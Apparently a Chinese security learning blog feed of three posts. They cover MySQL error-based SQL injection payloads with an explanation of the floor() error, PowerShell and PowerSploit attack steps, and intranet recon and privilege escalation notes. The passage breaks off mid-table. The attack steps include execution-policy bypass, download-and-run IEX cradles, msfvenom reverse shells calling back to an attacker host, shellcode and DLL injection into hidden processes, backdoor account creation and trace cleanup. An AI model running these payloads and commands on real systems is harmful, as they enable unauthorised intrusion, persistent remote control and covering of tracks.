    <id>http://goudanjun.vip/2021/03/11/sql注入报错函数总结.html/</id>
    <published>2021-03-11T08:52:53.000Z</published>
    <updated>2021-03-23T12:20:18.684Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于SQL注入的五大报错注入函数"><a href="#关于SQL注入的五大报错注入函数" class="headerlink" title="关于SQL注入的五大报错注入函数"></a>关于SQL注入的五大报错注入函数</h1><p>全部都以查user()为例子</p><a id="more"></a><h2 id="1-floor"><a href="#1-floor" class="headerlink" title="1.floor()"></a>1.floor()</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/11/Jo9RiTMsC5Btp1e.png" alt="953194-20160514223004359-1403466392"></p><h2 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a>2.extractvalue()</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 and (extractvalue(1, concat(0x5c,(<span class="keyword">select</span> <span class="keyword">user</span>()))))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/11/AaERQkJtlxPXwyp.png" alt="953194-20160514223041343-1723131573"></p><h2 id="3-updatexml"><a href="#3-updatexml" class="headerlink" title="3.updatexml()"></a>3.updatexml()</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1 and (updatexml(0x3a,concat(1,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/11/oJH7CKteA1R6EPh.png" alt="953194-20160514223111046-707785158"></p><h2 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp()"></a>4.exp()</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =1 and EXP(~(<span class="keyword">SELECT</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/11/AOJqScjifuYnN7l.png" alt="953194-20160514223142046-1477503952"></p><h2 id="5-有六种函数（但总的来说可以归为一类）"><a href="#5-有六种函数（但总的来说可以归为一类）" class="headerlink" title="5.有六种函数（但总的来说可以归为一类）"></a>5.有六种函数（但总的来说可以归为一类）</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GeometryCollection()</span><br><span class="line">id = 1 AND GeometryCollection((<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">polygon()</span><br><span class="line"><span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">AND</span> polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipoint()</span><br><span class="line"><span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring()</span><br><span class="line"><span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">linestring()</span><br><span class="line"><span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">AND</span> LINESTRING((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line">multipolygon()</span><br><span class="line"><span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">AND</span> multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/11/u3PRsDgTCpS8bMK.png" alt="953194-20160514223651015-716657416"></p><h1 id="Floor-函数报错原理"><a href="#Floor-函数报错原理" class="headerlink" title="Floor() 函数报错原理"></a>Floor() 函数报错原理</h1><h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a><strong>一、简述</strong></h2><p>floor报错注入是利用 `select count(<em>),(floor(rand(0)</em>2)) x from users group by x```这个相对固定的语句格式，导致的数据库报错。实际利用中通过 concat 函数，连接注入语句与 floor(rand(0)*2)函数，就实现了注入结果与报错信息回显的注入方式。具体利用本文不做阐述，本文重点探究该语句报错的原因，要理解该语句的报错原因，首先大家需要理解如下的关键函数的作用： count() 、group by 、floor()、rand()。</p><h2 id="二、关键函数说明"><a href="#二、关键函数说明" class="headerlink" title="二、关键函数说明"></a><strong>二、关键函数说明</strong></h2><h3 id="1-理解rand-函数"><a href="#1-理解rand-函数" class="headerlink" title="1.理解rand()函数"></a><strong>1.理解rand()函数</strong></h3><p>rand() 是一个随机函数，通过一个固定的随机数的种子0之后，可以形成固定的伪随机序列。结果如下图所示：</p><p>可见，直接使用rand函数每次产生的数都不同，但是当提供了一个固定的随机数的种子0之后：</p><p>这样每次产生的值都是一样的。也可以称之为伪随机（产生的数据都是可预知的）。<br>查看多个数据看一下。（users是一个有6行数据的表）</p><p><img src="https://i.loli.net/2021/03/23/gst6LGHlj754OAE.jpg" alt="图片.png"></p><p>这样第一次产生的随机数和第二次完全一样，也就是可以预测的。<br>那么floor报错注入利用的时候rand（0）*2为什么要乘以 2 呢？这就要配合floor 函数来说了。</p><h3 id="2-理解floor-rand-0-2-函数"><a href="#2-理解floor-rand-0-2-函数" class="headerlink" title="2.理解floor(rand(0)*2)函数"></a><strong>2.理解floor(rand(0)*2)函数</strong></h3><p>floor() 函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。</p><p>floor(rand(0)*2）就是对rand(0)产生的随机序列诚意2后的结果，再进行取整。得到伪随机序列为如下图所示：</p><p><img src="https://i.loli.net/2021/03/23/z3CdrTqDLPe7fks.jpg" alt="图片.png"></p><p>因为使用了固定的随机数种子0，他每次产生的随机数列都是相同的0 1 1 0 1 1的顺序。</p><h3 id="3-group-by-函数"><a href="#3-group-by-函数" class="headerlink" title="3.group by 函数"></a><strong>3.group by</strong> <strong>函数</strong></h3><p>group by 主要用来对数据进行分组（相同的分为一组）。</p><p>例如建立如下表进行实验</p><p><img src="https://i.loli.net/2021/03/23/vBR2oY1a9fPdblh.jpg" alt="图片.png"></p><p>通过如下语句进行查询。（这里在a和x之前缺省了as ，作用为用a和x代替原有的字段显示），显示的结果如下图所示：</p><p><img src="https://i.loli.net/2021/03/23/IgfpsAU4YyGXLxr.jpg" alt="图片.png"></p><p>但通过group by进行分组排序是，结果会进行分组，相同名字为合并。如下图所示</p><p><strong>注意：</strong>最后x这列中显示的每一类只有一次，前面的a的是第一次出现的id值</p><p><img src="https://i.loli.net/2021/03/23/qWHT8L1FIEMtnur.jpg" alt="图片.png"></p><h3 id="4-理解count（-）函数"><a href="#4-理解count（-）函数" class="headerlink" title="4.理解count（*）函数"></a><strong>4.理解count（*）函数</strong></h3><p><strong>count（*）统计结果的记录数。</strong></p><p>这里与group by结合使用看一下：</p><p><img src="https://i.loli.net/2021/03/23/AmplyH2aQWDdbuF.jpg" alt="图片.png"></p><p>这里就是对a中的重复性的数据进行了整合，然后计数，后面的x就是每一类的数量。也就是lisi有2个，wangwu有1个，zhangsan有3个。注意显示同样是按照ascii排序。</p><h2 id="三、报错原因分析"><a href="#三、报错原因分析" class="headerlink" title="三、报错原因分析"></a>三、报错原因分析</h2><p>大家已经了解，当执行如下语句时，就会产生一个报错。如下图所示</p><p><strong>select count(*),floor(rand(0)*2) x from users group by x;</strong></p><p><img src="https://i.loli.net/2021/03/23/zbHPBJFY9NnvcMo.jpg" alt="图片.png"></p><p>根据前面函数的理解，这句话本义就是统计后面产生随机数的种类并计算每种数量。原本执行结果一共6行数据，产生的随机序列应该为0 1 1 0 1 1 ，按照语句的含义，统计如果应该是：0是2个，1是4个，但是此处却产生了报错？这是为什么呢？下面来分析一下。</p><p>这里最关键的及时要理解group by函数的工作过程。group by key 在执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则更新临时表中的数据（更新数据时，不再计算rand值）；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。（插入数据时，会再计算rand值）</p><p>如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p><p>具体报错原因可以通过下列过程展示：</p><p>mysql执行结果，会产生 011011 这个序列，group by时，会建立空虚拟表如下图，然后从sql语句执行结果序列（011011）读取数据并插入虚表:</p><p><img src="https://i.loli.net/2021/03/23/FyzgXVeZoid4DY2.jpg" alt="图片.png"></p><p>（1）虚表写入第一条记录，执行floor(rand(0)*2)，发现结果为0(此时为第一次计算)</p><p><img src="https://i.loli.net/2021/03/23/fshmX71UDzJtl9G.jpg" alt="图片.png"></p><p>（2）查询虚拟表，发现0的键值不存在，则插入新的键值的时候floor(rand(0)*2)会被再计算一次，结果为1(此时为第二次计算)，插入虚表，第一条记录插入完毕，结果为1。如下图:</p><p><img src="https://i.loli.net/2021/03/23/z3ACZugm7pc6MB4.jpg" alt="图片.png"></p><p>（3）虚表写入第二条记录，再次计算floor(rand(0)<em>2)，发现结果为1(此时为第三次计算)，此时结算结果为1，所以floor(rand(0)</em>2)不会被计算，直接count(<em>)加1，第二条记录写入完毕。（5）查询虚表，发现1的键值存在，所以floor(rand(0)</em>2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕，结果如下:</p><p><img src="https://i.loli.net/2021/03/23/qfrw3elXzM4yWFZ.jpg" alt="图片.png"></p><p>（4）虚表写入第三条记录，再次计算floor(rand(0)<em>2)，发现结果为0(此时为第4次计算)，计算结果为0，此时虚表中没有0的数据记录，则执行插入该数据，插入时会再次计算floor(rand(0)</em>2)（此时为第5次计算），计算结果为1。然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以就产生了主键冲突的错误，也就是：Duplicate entry 的报错。</p><p><img src="https://i.loli.net/2021/03/23/VdvJPs6xFBDi1uG.jpg" alt="图片.png"></p><p>总结：</p><p>通过上述分析，在虚表中写入第三条记录是时，产生了报错。此时floor(rand(0)*2)一共被计算了5次，这也解释了为什么数据表中需要最少3条数据才会报错的原因。</p><p>另外，要注意加入随机数种子的问题，如果没加入随机数种子或者加入其他的数，那么floor(rand()<em>2)产生的序列是不可测的，这样可能会出现正常插入无法报错的情况。最重要的是前面几条记录查询后不能让虚表存在0,1键值，如果存在了，那无论多少条记录，也都没办法报错，因为floor(rand()</em>2)不会再被计算做为虚表的键值，这也就是为什么不加随机数种子有时候会报错，有时候不会报错的原因。</p><p>比如下面用1作为随机数种子，就不会产生报错：</p><p><img src="https://i.loli.net/2021/03/23/E1sS8OH63bFmwtT.jpg" alt="图片.png"></p><p><img src="https://i.loli.net/2021/03/23/7yo4WYqCmkZITfA.jpg" alt="图片.png"></p><p>参考文章：</p><p><a href="https://www.freebuf.com/column/235496.html" target="_blank" rel="noopener">https://www.freebuf.com/column/235496.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;关于SQL注入的五大报错注入函数&quot;&gt;&lt;a href=&quot;#关于SQL注入的五大报错注入函数&quot; class=&quot;headerlink&quot; title=&quot;关于SQL注入的五大报错注入函数&quot;&gt;&lt;/a&gt;关于SQL注入的五大报错注入函数&lt;/h1&gt;&lt;p&gt;全部都以查user()为例子&lt;/p&gt;
    
    </summary>
    
    
      <category term="SQL注入" scheme="http://goudanjun.vip/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>PowerShell学习全记录</title>
    <link href="http://goudanjun.vip/2021/03/10/PowerShell%E5%AD%A6%E4%B9%A0%E5%85%A8%E8%AE%B0%E5%BD%95.html/"/>
    <id>http://goudanjun.vip/2021/03/10/PowerShell学习全记录.html/</id>
    <published>2021-03-10T01:56:23.000Z</published>
    <updated>2021-03-18T09:21:34.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h1><h2 id="powershell执行策略"><a href="#powershell执行策略" class="headerlink" title="powershell执行策略"></a>powershell执行策略</h2><table><thead><tr><th align="center">策略</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">Restricted</td><td align="center">脚本不能运行</td></tr><tr><td align="center">AllSigned</td><td align="center">仅当脚本由受信任的发布者签名时才能运行</td></tr><tr><td align="center">RemoteSigned</td><td align="center">本地创建的脚本可以运行，但从网上下的不能运行</td></tr><tr><td align="center">Unrestricted</td><td align="center">允许所有的script运行</td></tr></tbody></table><a id="more"></a><p>查看策略</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span></span><br></pre></td></tr></table></figure><p>设置策略</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> &lt;策略&gt;</span><br></pre></td></tr></table></figure><h2 id="绕过powershell的执行策略"><a href="#绕过powershell的执行策略" class="headerlink" title="绕过powershell的执行策略"></a>绕过powershell的执行策略</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#绕过本地权限执行</span></span><br><span class="line">powershell.exe -Executionpolicy Bypass -File xxx.ps1</span><br><span class="line"><span class="comment">#本地隐藏绕过权限执行脚本</span></span><br><span class="line">powershell.exe -Executionpolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File xxx.ps1</span><br><span class="line"><span class="comment">#用IEX下载远程PS1脚本绕过权限执行</span></span><br><span class="line">powershell.exe -executionpolicy bypass -windowstyle hidden -nologo -noprofile IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[parameters]</span><br></pre></td></tr></table></figure><h1 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h1><p><img src="https://i.loli.net/2021/03/10/HtRshvr8z32Mqmp.png" alt="image-20210310102318531"></p><h2 id="powersploit实战"><a href="#powersploit实战" class="headerlink" title="powersploit实战"></a>powersploit实战</h2><h3 id="Invoke-Shellcode-进程注入反弹shell"><a href="#Invoke-Shellcode-进程注入反弹shell" class="headerlink" title="Invoke-Shellcode 进程注入反弹shell"></a>Invoke-Shellcode 进程注入反弹shell</h3><ol><li><p>MSF中设置监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_https</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/10/PGA1RtC6njxUdp7.png" alt="image-20210310113150127"></p></li><li><p>使用 msfvenom 生成一个 powershell 脚本木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.239.134 LPORT=4444 -f powershell -o /var/www/html/test</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/10/iNmq8tkLpY3fJb9.png" alt="image-20210310113211491"></p></li><li><p>目标机下载 invoke-shellcode 和 木马</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"http://192.168.239.134/powersploit/CodeExecution/Invoke-Shellcode.ps1"</span>)</span><br><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"http://192.168.239.134/test"</span>)</span><br></pre></td></tr></table></figure></li><li><p>创建一个新的进程进行注入</p></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> c:\windows\system32\notepad.exe -WindowStyle Hidden</span><br><span class="line">Invoke-Shellcode -ProcessID <span class="number">2816</span> -Shellcode (<span class="variable">$buf</span>) -Force</span><br></pre></td></tr></table></figure><h3 id="Invoke-DllInjection：dll注入"><a href="#Invoke-DllInjection：dll注入" class="headerlink" title="Invoke-DllInjection：dll注入"></a>Invoke-DllInjection：dll注入</h3><ol><li><p>使用msfvenom生成一个dll木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.239.134 LPORT=4444 -f dll -o /var/www/html/test.dll</span><br></pre></td></tr></table></figure></li><li><p>下载脚本和木马</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"http://192.168.239.134/powersploit/CodeExecution/Invoke-DllInjection.ps1"</span>)</span><br><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"http://192.168.239.134/test.dll"</span>)</span><br></pre></td></tr></table></figure></li><li><p>dll注入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> c:\windows\system32\notepad.exe -WindowStyle Hidden</span><br><span class="line">Invoke-DllInjection -ProcessID <span class="number">2816</span> -DLL c:\test.dll</span><br></pre></td></tr></table></figure></li></ol><h3 id="Invoke-Portscan：端口扫描"><a href="#Invoke-Portscan：端口扫描" class="headerlink" title="Invoke-Portscan：端口扫描"></a>Invoke-Portscan：端口扫描</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Portscan -hosts <span class="number">192.168</span>.<span class="number">239.1</span>,<span class="number">192.168</span>.<span class="number">239.134</span> -ports <span class="string">"80,22,3389"</span></span><br></pre></td></tr></table></figure><h2 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h2><p>主要用来寻找目标主机windows服务漏洞进行提权的脚本</p><h3 id="install-servicebinary模块添加用户"><a href="#install-servicebinary模块添加用户" class="headerlink" title="install-servicebinary模块添加用户"></a>install-servicebinary模块添加用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(<span class="string">"c:/powerup.ps1"</span>);Install-ServiceBinary -ServiceName <span class="string">'OmniServers'</span> -UserName gd1un -Password 123456</span><br></pre></td></tr></table></figure><p>OmniServers服务为一个可写入目录的系统服务，当管理员重新运行这个服务的时候就会创建一个gd1un的账户</p><h3 id="提权成功后清理入侵痕迹"><a href="#提权成功后清理入侵痕迹" class="headerlink" title="提权成功后清理入侵痕迹"></a>提权成功后清理入侵痕迹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(<span class="string">"c:/powerup.ps1"</span>);Restore-ServiceBinary -ServiceName <span class="string">'OmniServers'</span></span><br></pre></td></tr></table></figure><h3 id="MSI文件提权"><a href="#MSI文件提权" class="headerlink" title="MSI文件提权"></a>MSI文件提权</h3><p>查看注册表中的 AlwaysInstallElevated 权限，若为 true 则可进行msi文件提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(<span class="string">"c:/powerup.ps1"</span>);Get-RegistryAlwaysInstallElevated </span><br><span class="line">Write-UserAddMSI</span><br><span class="line">net user <span class="comment">#查看用户</span></span><br><span class="line">net localgroup administrator   <span class="comment">#查看管理员账户</span></span><br></pre></td></tr></table></figure><h1 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h1><p>针对 windows ，利用powershell进行内网渗透的集成攻击框架</p><h1 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h1>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;PowerShell&quot;&gt;&lt;a href=&quot;#PowerShell&quot; class=&quot;headerlink&quot; title=&quot;PowerShell&quot;&gt;&lt;/a&gt;PowerShell&lt;/h1&gt;&lt;h2 id=&quot;powershell执行策略&quot;&gt;&lt;a href=&quot;#powershell执行策略&quot; class=&quot;headerlink&quot; title=&quot;powershell执行策略&quot;&gt;&lt;/a&gt;powershell执行策略&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;策略&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;Restricted&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;脚本不能运行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;AllSigned&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;仅当脚本由受信任的发布者签名时才能运行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;RemoteSigned&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;本地创建的脚本可以运行，但从网上下的不能运行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;Unrestricted&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;允许所有的script运行&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
    
    </summary>
    
    
      <category term="内网" scheme="http://goudanjun.vip/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>内网学习记录</title>
    <link href="http://goudanjun.vip/2021/03/08/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.html/"/>
    <id>http://goudanjun.vip/2021/03/08/内网学习记录.html/</id>
    <published>2021-03-08T11:36:50.000Z</published>
    <updated>2021-03-18T09:21:01.644Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net user /domain<span class="comment">#查看域用户</span></span><br><span class="line">net view /domain<span class="comment">#查看有几个域</span></span><br><span class="line">net view /domain:XXX<span class="comment">#查看域内主机</span></span><br><span class="line">net group /domain<span class="comment">#查看域里面的组</span></span><br><span class="line">net group <span class="string">"domain computers"</span> /domain<span class="comment">#查看域内所有主机名</span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain<span class="comment">#查看域管理员</span></span><br><span class="line">net group <span class="string">"domain controllers"</span> /domain<span class="comment">#查看域控制器</span></span><br><span class="line">net group <span class="string">"enterprise admins"</span> /domain<span class="comment">#查看企业管理组</span></span><br><span class="line">nettime /domain<span class="comment">#查看时间服务器</span></span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>提权之前：第一次getshell的时候要进行进程的迁移，进而获取稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#手动迁移</span></span><br><span class="line">migrate &lt;PID&gt;</span><br><span class="line"><span class="comment">#自动迁移</span></span><br><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure><h2 id="windows各漏洞对应补丁："><a href="#windows各漏洞对应补丁：" class="headerlink" title="windows各漏洞对应补丁："></a>windows各漏洞对应补丁：</h2><p><img src="https://i.loli.net/2021/03/08/bWeiuH2Cl9Xnmcw.jpg" alt="IMG_0726(20210308-110246)"><img src="https://i.loli.net/2021/03/08/2cKIuaoPyVNTCZl.jpg" alt="IMG_0727(20210308-110307)"></p><h3 id="ms16-032实验："><a href="#ms16-032实验：" class="headerlink" title="ms16_032实验："></a>ms16_032实验：</h3><p>getshell后是用户权限：</p><p><img src="https://i.loli.net/2021/03/08/jgHM8fcr5Eo7KlW.png" alt="image-20210308204554539"></p><p>将这个session放到后台运行，搜索ms16032，设置session为刚才的session</p><p><img src="https://i.loli.net/2021/03/08/gPA3LD7CSu2Bf1m.png" alt="image-20210308204708951"></p><p>提权后：</p><p><img src="https://i.loli.net/2021/03/08/Rev19GBgq4OVA2E.png" alt="image-20210308204751797"></p><h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><h3 id="0x00-常⻅信息收集命令"><a href="#0x00-常⻅信息收集命令" class="headerlink" title="0x00 常⻅信息收集命令"></a><strong>0x00 常⻅信息收集命令</strong></h3><table><thead><tr><th align="left">命令</th><th>结果</th></tr></thead><tbody><tr><td align="left">uname -a</td><td>打印所有可⽤的系统信息</td></tr><tr><td align="left">cat /proc/version</td><td>内核版本信息</td></tr><tr><td align="left">cat /etc/*-release(issues)</td><td>Linux发行版本信息</td></tr><tr><td align="left">df -a</td><td>文件系统信息</td></tr><tr><td align="left">dpkg –list 2&gt;/dev/null| grep compiler |grep -v decompiler 2&gt;/dev/null &amp;&amp; yum list installed ‘gcc*’ 2&gt;/dev/null| grep gcc 2&gt;/dev/null</td><td>列出可用的编辑器</td></tr><tr><td align="left">lpstat -a</td><td>查看是否有打印机</td></tr><tr><td align="left">ps auxtop cat/etc/service</td><td>查看进程相关信息</td></tr><tr><td align="left">crontab -l；ls -alh /var/spool/cron；ls -al /etc/ | grep cron；ls -al /etc/cron<em>cat /etc/cron</em>；cat /etc/at.allow；cat /etc/at.deny；cat /etc/cron.allow；cat /etc/cron.deny；cat /etc/crontab；cat /etc/anacrontab；cat /var/spool/cron/crontabs/root</td><td>查看计划任务的相关信息</td></tr><tr><td align="left">grep -i user [filename]；grep -i pass [filename；]grep -C 5 “password” [filename]；find . -name “*.php” -print0 | xargs -0 grep-i -n “var $password”</td><td>查看可能具有⼝令的⽂件</td></tr></tbody></table><h3 id="0x01-sudo滥⽤提权"><a href="#0x01-sudo滥⽤提权" class="headerlink" title="0x01 sudo滥⽤提权"></a><strong>0x01 sudo滥⽤提权</strong></h3><p>使⽤sudo -l命令可以查看当前⽤户允许执⾏的提权命令。</p><h3 id="0x02-内核漏洞提权"><a href="#0x02-内核漏洞提权" class="headerlink" title="0x02 内核漏洞提权"></a><strong>0x02 内核漏洞提权</strong></h3><p>Linux漏洞汇总（通过ExDB查找PoC）</p><table><thead><tr><th>发布时间</th><th>漏洞描述</th><th>发布作者</th></tr></thead><tbody><tr><td>2019/12/16</td><td>Linux 5.3 - PrivilegeEscalation via io_uringOffload of sendmsg() ontoKernel Thread with KernelCreds</td><td>Google Security Research</td></tr><tr><td>2019/10/24</td><td>Linux Polkit - pkexec helperPTRACE_TRACEME localroot (Metasploit)</td><td>Metasploit</td></tr><tr><td>2019/07/17</td><td>Linux - Broken Permissionand Object Lifetime Handlingfor PTRACE_TRACEME</td><td>Google Security Research</td></tr><tr><td>2018/11/29</td><td>Linux - Nested UserNamespace idmap LimitLocal Privilege Escalation(Metasploit)</td><td>Metasploit</td></tr><tr><td>2018/11/16</td><td>Linux - Broken uid/gidMapping for Nested UserNamespaces</td><td>Google Security Research</td></tr><tr><td>2018/09/26</td><td>Linux Kernel - VMA Use-After-Free via 